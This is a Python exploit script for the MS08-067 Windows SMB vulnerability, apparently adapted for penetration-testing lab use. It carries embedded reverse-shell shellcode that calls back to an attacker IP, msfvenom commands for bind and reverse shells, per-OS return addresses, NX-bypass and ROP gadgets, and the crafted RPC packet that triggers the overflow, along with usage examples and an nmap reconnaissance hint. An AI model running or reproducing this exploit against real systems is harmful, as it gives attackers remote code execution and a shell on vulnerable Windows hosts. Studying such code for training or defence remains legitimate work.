#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError:
    print('Install the following library to make this script work')
    print('Impacket : https://github.com/CoreSecurity/impacket.git')
    print('PyCrypto : https://pypi.python.org/pypi/pycrypto')
    sys.exit(1)

print('#######################################################################')
print('# MS08-067 Exploit')
print('# This is a modified verion of Debasis Mohanty\'s code')
print('# The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi')
print('#')
print('# Mod in 2018 by Andy Acer:')
print('# - Added support for selecting a target port at the command line.')
print('# It seemed that only 445 was previously supported.')
print('# - Changed library calls to correctly establish a NetBIOS session for SMB transport')
print('# - Changed shellcode handling to allow for variable length shellcode. Just cut and paste')
print('# into this source file.')
print('#######################################################################\n')

#REPLACE THIS SHELLCODE with shellcode generated for your use
#Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
#msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
#Reverse TCP to 10.11.0.157 port 62000:

shellcode=(
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xb1\xf1\x85\xb9\x83\xee\xfc\xe2\xf4\x4d\x19\x07\xb9\xb1\xf1"
"\xe5\x30\x54\xc0\x45\xdd\x3a\xa1\xb5\x32\xe3\xfd\x0e\xeb\xa5"
"\x7a\xf7\x91\xbe\x46\xcf\x9f\x80\x0e\x29\x85\xd0\x8d\x87\x95"
"\x91\x30\x4a\xb4\xb0\x36\x67\x4b\xe3\xa6\x0e\xeb\xa1\x7a\xcf"
"\x85\x3a\xbd\x94\xc1\x52\xb9\x84\x68\xe0\x7a\xdc\x99\xb0\x22"
"\x0e\xf0\xa9\x12\xbf\xf0\x3a\xc5\x0e\xb8\x67\xc0\x7a\x15\x70"
"\x3e\x88\xb8\x76\xc9\x65\xcc\x47\xf2\xf8\x41\x8a\x8c\xa1\xcc"
"\x55\xa9\x0e\xe1\x95\xf0\x56\xdf\x3a\xfd\xce\x32\xe9\xed\x84"
"\x6a\x3a\xf5\x0e\xb8\x61\x78\xc1\x9d\x95\xaa\xde\xd8\xe8\xab"
"\xd4\x46\x51\xae\xda\xe3\x3a\xe3\x6e\x34\xec\x99\xb6\x8b\xb1"
"\xf1\xed\xce\xc2\xc3\xda\xed\xd9\xbd\xf2\x9f\xb6\x0e\x50\x01"
"\x21\xf0\x85\xb9\x98\x35\xd1\xe9\xd9\xd8\x05\xd2\xb1\x0e\x50"
"\xe9\xe1\xa1\xd5\xf9\xe1\xb1\xd5\xd1\x5b\xfe\x5a\x59\x4e\x24"
"\x12\xd3\xb4\x99\x8f\xb3\xa1\xf6\xed\xbb\xb1\xe0\xd9\x30\x57"
"\x9b\x95\xef\xe6\x99\x1c\x1c\xc5\x90\x7a\x6c\x34\x31\xf1\xb5"
"\x4e\xbf\x8d\xcc\x5d\x99\x75\x0c\x13\xa7\x7a\x6c\xd9\x92\xe8"
"\xdd\xb1\x78\x66\xee\xe6\xa6\xb4\x4f\xdb\xe3\xdc\xef\x53\x0c"
"\xe3\x7e\xf5\xd5\xb9\xb8\xb0\x7c\xc1\x9d\xa1\x37\x85\xfd\xe5"
"\xa1\xd3\xef\xe7\xb7\xd3\xf7\xe7\xa7\xd6\xef\xd9\x88\x49\x86"
"\x37\x0e\x50\x30\x51\xbf\xd3\xff\x4e\xc1\xed\xb1\x36\xec\xe5"
"\x46\x64\x4a\x65\xa4\x9b\xfb\xed\x1f\x24\x4c\x18\x46\x64\xcd"
"\x83\xc5\xbb\x71\x7e\x59\xc4\xf4\x3e\xfe\xa2\x83\xea\xd3\xb1"
"\xa2\x7a\x6c"
)

#Gotta make No-Ops (NOPS) + shellcode = 410 bytes

num_nops = 410 - len(shellcode)
newshellcode = "\x90" * num_nops
newshellcode += shellcode # Add NOPS to the front
shellcode = newshellcode # Switcheroo with the newshellcode temp variable

#print "Shellcode length: %s\n\n" % len(shellcode)

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000

def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
    rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
    'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret

class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()
        print("test")
        # MODIFIED HERE
        # Changed __port to port ... not sure if that does anything. I'm a newb.
        self.port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print('Windows XP SP0/SP1 Universal\n')
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print('Windows 2000 Universal\n')
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print('Windows 2003 SP0 Universal\n')
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print('Windows 2003 SP1 English\n')
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print('Windows XP SP3 French (NX)\n')
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print('Windows XP SP3 English (NX)\n')
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print('Windows XP SP3 English (AlwaysOn NX)\n')
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print('Not supported OS version\n')
            sys.exit(-1)

        print('[-]Initiating connection')

        # MORE MODIFICATIONS HERE #############################################################################################

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
        
        self.__trans.connect()
        print('[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        
        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = "\x00\x00\x00\x00"
        ActualCount = "\x36\x01\x00\x00" # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"        

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print('Exploit finish\n')

if __name__ == '__main__':
    try:
        target = sys.argv[1]
        os = sys.argv[2]
        port = sys.argv[3]
    except IndexError:
        print('\nUsage: %s <os #> <Port #>\n' % sys.argv[0])
        print('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
        print('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
        print('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
        print('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
        print('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
        print('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
        print('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
        print('')
        print('Also: nmap has a good OS discovery script that pairs well with this exploit:')
        print('nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1')
        print('')
        sys.exit(-1)

current = SRVSVC_Exploit(target, os, port)
current.start()